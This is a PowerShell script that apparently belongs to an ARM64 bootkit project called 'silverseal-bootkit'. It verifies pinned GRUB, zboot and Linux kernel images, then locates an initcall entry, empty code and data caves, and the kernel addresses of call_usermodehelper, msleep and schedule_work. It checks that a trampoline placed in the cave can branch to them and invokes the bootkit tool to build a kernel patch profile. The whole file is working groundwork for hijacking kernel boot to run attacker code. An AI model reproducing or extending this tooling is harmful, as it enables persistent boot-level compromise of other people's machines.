[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$ArtifactDirectory,

    [string]$ManifestPath,

    [string]$OutputDirectory,

    [switch]$VerifyOnly
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

if (-not $ManifestPath) {
    $ManifestPath = Join-Path $PSScriptRoot "..\fixtures\arm64\7.0.0-31-generic\manifest.json"
}
if (-not $OutputDirectory) {
    $OutputDirectory = Join-Path $PSScriptRoot "..\target\arm64-fixture\7.0.0-31-generic"
}

function Convert-HexBytes([string]$Path) {
    $hex = (Get-Content -Raw -LiteralPath $Path) -replace '\s', ''
    if (($hex.Length -eq 0) -or (($hex.Length % 2) -ne 0) -or ($hex -notmatch '^[0-9a-fA-F]+$')) {
        throw "Invalid hexadecimal signature file: $Path"
    }
    $bytes = [byte[]]::new($hex.Length / 2)
    for ($index = 0; $index -lt $bytes.Length; $index++) {
        $bytes[$index] = [Convert]::ToByte($hex.Substring($index * 2, 2), 16)
    }
    return $bytes
}

function Convert-HexUInt64([string]$Value) {
    if ($Value -notmatch '^0x[0-9a-fA-F]+$') {
        throw "Invalid hexadecimal integer: $Value"
    }
    return [Convert]::ToUInt64($Value.Substring(2), 16)
}

function Read-UInt16([byte[]]$Bytes, [long]$Offset) {
    if ($Offset -lt 0 -or ($Offset + 2) -gt $Bytes.LongLength) { throw "Truncated UInt16 at $Offset" }
    return [BitConverter]::ToUInt16($Bytes, [int]$Offset)
}

function Read-UInt32([byte[]]$Bytes, [long]$Offset) {
    if ($Offset -lt 0 -or ($Offset + 4) -gt $Bytes.LongLength) { throw "Truncated UInt32 at $Offset" }
    return [BitConverter]::ToUInt32($Bytes, [int]$Offset)
}

function Find-BytePattern([byte[]]$Haystack, [byte[]]$Needle) {
    if ($Needle.Length -eq 0) { throw "Cannot search for an empty signature" }
    $matches = [System.Collections.Generic.List[long]]::new()
    $cursor = 0
    $lastStart = $Haystack.Length - $Needle.Length
    while ($cursor -le $lastStart) {
        $candidate = [Array]::IndexOf($Haystack, $Needle[0], $cursor)
        if (($candidate -lt 0) -or ($candidate -gt $lastStart)) { break }
        $equal = $true
        for ($index = 1; $index -lt $Needle.Length; $index++) {
            if ($Haystack[$candidate + $index] -ne $Needle[$index]) {
                $equal = $false
                break
            }
        }
        if ($equal) { $matches.Add($candidate) }
        $cursor = $candidate + 1
    }
    return $matches.ToArray()
}

function Assert-Hash([string]$Path, [string]$Expected) {
    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { throw "Missing pinned artifact: $Path" }
    $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $Path).Hash.ToLowerInvariant()
    if ($actual -ne $Expected.ToLowerInvariant()) {
        throw "SHA-256 mismatch for $Path`nexpected: $Expected`nactual:   $actual"
    }
}

function Assert-Unique([byte[]]$Bytes, [byte[]]$Signature, [string]$Name) {
    $matches = @(Find-BytePattern $Bytes $Signature)
    if ($matches.Count -ne 1) { throw "$Name signature must occur exactly once; found $($matches.Count)" }
    return [long]$matches[0]
}

function Get-UniquePeRawSection([byte[]]$Image, [string]$Name) {
    if ($Image.Length -lt 0x40 -or $Image[0] -ne 0x4d -or $Image[1] -ne 0x5a) {
        throw "Staged kernel is not an MZ image"
    }
    $pe = [long](Read-UInt32 $Image 0x3c)
    if (($pe + 24) -gt $Image.Length -or
        $Image[$pe] -ne 0x50 -or $Image[$pe + 1] -ne 0x45 -or
        $Image[$pe + 2] -ne 0 -or $Image[$pe + 3] -ne 0) {
        throw "Staged kernel has no bounded PE signature"
    }
    $coff = $pe + 4
    if ((Read-UInt16 $Image $coff) -ne 0xaa64) { throw "Nested PE is not ARM64" }
    $sectionCount = [int](Read-UInt16 $Image ($coff + 2))
    $optionalSize = [int](Read-UInt16 $Image ($coff + 16))
    $optional = $coff + 20
    if ((Read-UInt16 $Image $optional) -ne 0x20b) { throw "Nested PE is not PE32+" }
    $table = $optional + $optionalSize
    if (($table + 40L * $sectionCount) -gt $Image.Length) { throw "Truncated PE section table" }
    $expectedName = [byte[]]::new(8)
    $nameBytes = [Text.Encoding]::ASCII.GetBytes($Name)
    if ($nameBytes.Length -gt 8) { throw "PE section name is too long" }
    [Array]::Copy($nameBytes, $expectedName, $nameBytes.Length)
    $found = @()
    for ($index = 0; $index -lt $sectionCount; $index++) {
        $section = $table + 40L * $index
        $matches = $true
        for ($byte = 0; $byte -lt 8; $byte++) {
            if ($Image[$section + $byte] -ne $expectedName[$byte]) { $matches = $false; break }
        }
        if ($matches) {
            $rawSize = [long](Read-UInt32 $Image ($section + 16))
            $rawOffset = [long](Read-UInt32 $Image ($section + 20))
            if ($rawSize -le 0 -or $rawOffset -lt 0 -or ($rawOffset + $rawSize) -gt $Image.Length) {
                throw "PE section $Name has an invalid raw range"
            }
            $found += ,@($rawOffset, $rawSize)
        }
    }
    if ($found.Count -ne 1) { throw "Expected exactly one PE section $Name; found $($found.Count)" }
    return $found[0]
}

function Assert-BranchRange([UInt64]$Source, [UInt64]$Target, [string]$Name) {
    if (($Source % 4) -ne 0 -or ($Target % 4) -ne 0) { throw "$Name branch endpoint is not aligned" }
    if ($Target -ge $Source) {
        if (($Target - $Source) -gt 134217724) { throw "$Name exceeds the AArch64 B/BL positive range" }
    } elseif (($Source - $Target) -gt 134217728) {
        throw "$Name exceeds the AArch64 B/BL negative range"
    }
}

function Assert-AdrpRange([UInt64]$Source, [UInt64]$Target, [string]$Name) {
    $sourcePage = $Source - ($Source % 4096)
    $targetPage = $Target - ($Target % 4096)
    if ($targetPage -ge $sourcePage) {
        if (($targetPage - $sourcePage) -gt 4294963200) { throw "$Name exceeds ADRP range" }
    } elseif (($sourcePage - $targetPage) -gt 4294967296) {
        throw "$Name exceeds ADRP range"
    }
}

$manifestPath = (Resolve-Path -LiteralPath $ManifestPath).Path
$fixtureDirectory = Split-Path -Parent $manifestPath
$manifest = Get-Content -Raw -LiteralPath $manifestPath | ConvertFrom-Json
if ($manifest.schema_version -ne 1 -or $manifest.profile_version -ne 3) {
    throw "Unsupported fixture manifest or profile version"
}

$artifactDirectory = (Resolve-Path -LiteralPath $ArtifactDirectory).Path
$grubPath = Join-Path $artifactDirectory $manifest.artifacts.grub.file
$vmlinuxPath = Join-Path $artifactDirectory $manifest.artifacts.vmlinux.file
$vmlinuzPath = Join-Path $artifactDirectory $manifest.artifacts.vmlinuz.file
$systemMapPath = Join-Path $artifactDirectory $manifest.artifacts.system_map.file
Assert-Hash $grubPath $manifest.artifacts.grub.sha256
Assert-Hash $vmlinuxPath $manifest.artifacts.vmlinux.sha256
Assert-Hash $vmlinuzPath $manifest.artifacts.vmlinuz.sha256
Assert-Hash $systemMapPath $manifest.artifacts.system_map.sha256

$kernelLength = Convert-HexUInt64 $manifest.artifacts.vmlinux.length
if ([UInt64](Get-Item -LiteralPath $vmlinuxPath).Length -ne $kernelLength) {
    throw "Pinned vmlinux length mismatch"
}

$grubSignature = Convert-HexBytes (Join-Path $fixtureDirectory $manifest.signatures.grub.file)
$zbootSignature = Convert-HexBytes (Join-Path $fixtureDirectory $manifest.signatures.zboot.file)
$initcallSignature = Convert-HexBytes (Join-Path $fixtureDirectory $manifest.signatures.initcall.file)
$caveSignature = Convert-HexBytes (Join-Path $fixtureDirectory $manifest.signatures.code_cave.file)
$scheduleSignature = Convert-HexBytes (Join-Path $fixtureDirectory $manifest.signatures.schedule_work.file)
$grubBytes = [IO.File]::ReadAllBytes($grubPath)
$vmlinuxBytes = [IO.File]::ReadAllBytes($vmlinuxPath)
$vmlinuzBytes = [IO.File]::ReadAllBytes($vmlinuzPath)
$grubMatch = Assert-Unique $grubBytes $grubSignature "GRUB"
$initcallMatch = Assert-Unique $vmlinuxBytes $initcallSignature "initcall"
$caveMatch = Assert-Unique $vmlinuxBytes $caveSignature "code cave"
$null = Assert-Unique $vmlinuxBytes $scheduleSignature "schedule_work.isra.0"

$linuxSection = Get-UniquePeRawSection $vmlinuzBytes ".linux"
$nestedBytes = [byte[]]::new([int]$linuxSection[1])
[Array]::Copy($vmlinuzBytes, [int]$linuxSection[0], $nestedBytes, 0, $nestedBytes.Length)
$null = Assert-Unique $nestedBytes $zbootSignature "stock zboot decompressor"

$caveStart = $caveMatch + [long]$manifest.signatures.code_cave.profile_offset
$caveEnd = $caveStart + [long]$manifest.signatures.code_cave.capacity
if ($caveStart -lt 0 -or $caveEnd -gt $vmlinuxBytes.Length) { throw "Code cave lies outside vmlinux" }
for ($index = $caveStart; $index -lt $caveEnd; $index++) {
    if ($vmlinuxBytes[$index] -ne 0) { throw "Code cave contains a non-zero byte at 0x$($index.ToString('x'))" }
}

$kernelBase = Convert-HexUInt64 $manifest.kernel_virtual_base
$dataCave = Convert-HexUInt64 $manifest.virtual_addresses.data_cave
$dataOffset = [long]($dataCave - $kernelBase)
$dataEnd = $dataOffset + [long]$manifest.data_cave.capacity
if ($dataOffset -lt 0 -or $dataEnd -gt $vmlinuxBytes.Length) { throw "Data cave lies outside vmlinux" }
for ($index = $dataOffset; $index -lt $dataEnd; $index++) {
    if ($vmlinuxBytes[$index] -ne 0) { throw "Data cave contains a non-zero byte at 0x$($index.ToString('x'))" }
}

$initcallEntry = Convert-HexUInt64 $manifest.virtual_addresses.initcall_entry
$entryOffset = $initcallMatch + [long]$manifest.signatures.initcall.profile_offset
$prel32 = [BitConverter]::ToInt32($vmlinuxBytes, [int]$entryOffset)
if ($prel32 -lt 0) {
    $resolvedInitcall = $initcallEntry - [UInt64](-[Int64]$prel32)
} else {
    $resolvedInitcall = $initcallEntry + [UInt64]$prel32
}
$originalInitcall = Convert-HexUInt64 $manifest.virtual_addresses.original_initcall
if ($resolvedInitcall -ne $originalInitcall) { throw "PREL32 initcall target mismatch" }

$linkedSchedule = Convert-HexUInt64 $manifest.virtual_addresses.schedule_work
$systemMap = Get-Content -LiteralPath $systemMapPath
if ($systemMap -notcontains ("{0:x16} T _text" -f $kernelBase)) { throw "Pinned linked _text is absent from System.map" }
if ($systemMap -notcontains ("{0:x16} t schedule_work.isra.0" -f $linkedSchedule)) {
    throw "Pinned linked schedule_work.isra.0 is absent from System.map"
}

$codeCave = Convert-HexUInt64 $manifest.virtual_addresses.code_cave
$msleep = Convert-HexUInt64 $manifest.virtual_addresses.msleep
$callUsermodehelper = Convert-HexUInt64 $manifest.virtual_addresses.call_usermodehelper
Assert-BranchRange $codeCave $linkedSchedule "schedule_work"
Assert-BranchRange $codeCave $msleep "msleep"
Assert-BranchRange $codeCave $callUsermodehelper "call_usermodehelper"
Assert-BranchRange $codeCave $originalInitcall "original initcall"
Assert-AdrpRange $codeCave $dataCave "trampoline data cave"

Write-Host "Pinned ARM64 GRUB, stock zboot, kernel, caves, and System.map verified."
if ($VerifyOnly) { return }

$outputDirectory = [IO.Path]::GetFullPath($OutputDirectory)
[IO.Directory]::CreateDirectory($outputDirectory) | Out-Null
$outputs = @{
    grub = Join-Path $outputDirectory "grub-linux-boot-image.sig"
    zboot = Join-Path $outputDirectory "zboot-decompress.sig"
    initcall = Join-Path $outputDirectory "kernel-initcall-table.sig"
    cave = Join-Path $outputDirectory "kernel-code-cave-context.sig"
    schedule = Join-Path $outputDirectory "kernel-schedule-work.sig"
    profile = Join-Path $outputDirectory "7.0.0-31-generic.ssarm64p"
}
foreach ($output in $outputs.Values) {
    if (Test-Path -LiteralPath $output) { throw "Refusing to overwrite existing fixture output: $output" }
}
[IO.File]::WriteAllBytes($outputs.grub, $grubSignature)
[IO.File]::WriteAllBytes($outputs.zboot, $zbootSignature)
[IO.File]::WriteAllBytes($outputs.initcall, $initcallSignature)
[IO.File]::WriteAllBytes($outputs.cave, $caveSignature)
[IO.File]::WriteAllBytes($outputs.schedule, $scheduleSignature)

$repositoryRoot = [IO.Path]::GetFullPath((Join-Path $PSScriptRoot ".."))
$toolArguments = @(
    "run", "-p", "silverseal-bootkit", "--bin", "silverseal-arm64-tool", "--features", "arm64-tools", "--", "profile",
    "--grub-signature", $outputs.grub,
    "--zboot-signature", $outputs.zboot,
    "--initcall-signature", $outputs.initcall,
    "--code-cave-signature", $outputs.cave,
    "--schedule-work-signature", $outputs.schedule,
    "--initcall-entry-offset", [string]$manifest.signatures.initcall.profile_offset,
    "--code-cave-offset", [string]$manifest.signatures.code_cave.profile_offset,
    "--code-cave-capacity", [string]$manifest.signatures.code_cave.capacity,
    "--data-cave-capacity", [string]$manifest.data_cave.capacity,
    "--kernel-image-len", [string]$kernelLength,
    "--initcall-entry-virtual", [string]$manifest.virtual_addresses.initcall_entry,
    "--code-cave-virtual", [string]$manifest.virtual_addresses.code_cave,
    "--data-cave-virtual", [string]$manifest.virtual_addresses.data_cave,
    "--schedule-work-virtual", [string]$manifest.virtual_addresses.schedule_work,
    "--msleep-virtual", [string]$manifest.virtual_addresses.msleep,
    "--call-usermodehelper-virtual", [string]$manifest.virtual_addresses.call_usermodehelper,
    "--module-path", [string]$manifest.module_path,
    "--output", $outputs.profile
)
Push-Location $repositoryRoot
try {
    & cargo @toolArguments
    if ($LASTEXITCODE -ne 0) { throw "silverseal-arm64-tool failed to create the pinned profile" }
} finally {
    Pop-Location
}
Write-Host "Created pinned ARM64 profile: $($outputs.profile)"
